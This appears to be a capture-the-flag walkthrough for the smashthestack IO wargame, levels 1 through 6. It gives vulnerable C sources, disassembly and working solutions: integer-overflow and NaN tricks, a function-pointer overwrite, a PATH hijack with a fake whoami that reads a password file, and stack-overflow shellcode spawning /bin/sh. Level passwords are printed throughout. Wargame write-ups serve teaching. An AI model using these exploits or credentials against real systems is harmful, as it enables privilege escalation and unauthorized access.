# [smashthestack](http://smashthestack.org/)

## [IO](http://io.smashthestack.org:84/)

### level 1

        # ssh level1@io.smashthestack.org
        password: level1
        
        # cd /levels/
        # gdb level01
        (gdb) disassemble main
        
        Dump of assembler code for function main:
        0x08048080 <+0>:	push   $0x8049128
        0x08048085 <+5>:	call   0x804810f <puts>
        0x0804808a <+10>:	call   0x804809f <fscanf>
        0x0804808f <+15>:	cmp    $0x10f,%eax
        0x08048094 <+20>:	je     0x80480dc <YouWin>
        0x0804809a <+26>:	call   0x8048103 <exit>
        End of assembler dump.
        
        # ./level01
        Enter the 3 digit passcode to enter: 271
        Congrats you found it, now read the password for level2 from /home/level2/.pass
        
### level 2

        # ssh level2@io.smashthestack.org
        password: 3ywr07ZFw5IsdKzU

#### level02
        
        # cat /levels/level02.c
        
        #include <stdio.h>
        #include <stdlib.h>
        #include <signal.h>
        #include <setjmp.h>

        void catcher(int a)
        {
            setresuid(geteuid(),geteuid(),geteuid());
            printf("WIN!\n");
            system("/bin/sh");
            exit(0);
        }

        int main(int argc, char **argv)
        {
            puts("source code is available in level02.c\n");

            if (argc != 3 || !atoi(argv[2]))
                return 1;
            signal(SIGFPE, catcher);
            return abs(atoi(argv[1])) / atoi(argv[2]);
        }

        # /levels/level02 -2147483648 -1
        WIN!

#### level02_alt

        # cat /levels/level02.c

        #include <stdio.h>
        #include <stdlib.h>
        #include <unistd.h>

        #define answer 3.141593

        void main(int argc, char **argv) {
            float a = (argc - 2)?: strtod(argv[1], 0);
            
            printf("You provided the number %f which is too ", a);
            if(a < answer)
                puts("low");
            else if(a > answer)
                puts("high");
            else
                execl("/bin/sh", "sh", "-p", NULL);
        }

        
        # /levels/level02_alt nan
        
### level 3

        # ssh level3@io.smashthestack.org
        password: IFd92yzOnSMv9tkX

        # cat /levels/level03.c
        
        #include <stdio.h>
        #include <string.h>

        void good()
        {
            puts("Win.");
            execl("/bin/sh", "sh", NULL);
        }
        void bad()
        {
            printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
        }

        int main(int argc, char **argv, char **envp)
        {
            void (*functionpointer)(void) = bad;
            char buffer[50];

            if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

            memcpy(buffer, argv[1], strlen(argv[1]));
            memset(buffer, 0, strlen(argv[1]) - 4);

            printf("This is exciting we're going to %p\n", functionpointer);
            functionpointer();

            return 0;
        }
        
        # /levels/level03 something
        
        This is exciting we're going to 0x80484a4
        I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
        
        # /levels/level03 `echo -e "123451234512345123451234512345123451234512345123451234512345123451234512345=\x74"`
        This is exciting we're going to 0x8048474
        Win.

### level 4

        # ssh level4@io.smashthestack.org
        password: nSwmULj2LpDnRGU2

        # cat /levels/level04.c
        
        #include <stdlib.h>
        #include <stdio.h>

        int main() {
            char username[1024];
            FILE* f = popen("whoami","r");
            fgets(username, sizeof(username), f);
            printf("Welcome %s", username);

            return 0;
        }
        
        # /levels/level04
        Welcome level5
        
        # mkdir /tmp/ving_dir
        # echo cat /home/level5/.pass >> /tmp/ving_dir/whoami
        # chmod 777 /tmp/ving_dir/whoami
        # ls -l /tmp/ving_dir
        -rwxrwxrwx 1 level4 level4 23 Nov 24 10:44 whoami
        
        # PATH="/tmp/ving_dir:$PATH"
        # echo $PATH
        /tmp/ving_dir:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
        
        # /levels/level04
        Welcome LOoCy5PbKi63qXTh
        
### level 5

        # ssh level5@io.smashthestack.org
        password: LOoCy5PbKi63qXTh

        # cat /levels/level05.c
        
        #include <stdio.h>
        #include <string.h>

        int main(int argc, char **argv) {
            char buf[128];
            if(argc < 2) return 1;
            strcpy(buf, argv[1]);
            printf("%s\n", buf);
            return 0;
        }
        
        # /levels/level05 `python -c 'print "\x90"*88+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"+"\x90"*26+"\xb0\xfb\xff\xbf"'`
        
        # cat /home/level6/.pass
        rXCikld0ex3EQsnI

### level 6

        # ssh level6@io.smashthestack.org
        password: rXCikld0ex3EQsnI
        
        # cat /levels/level06.c
        
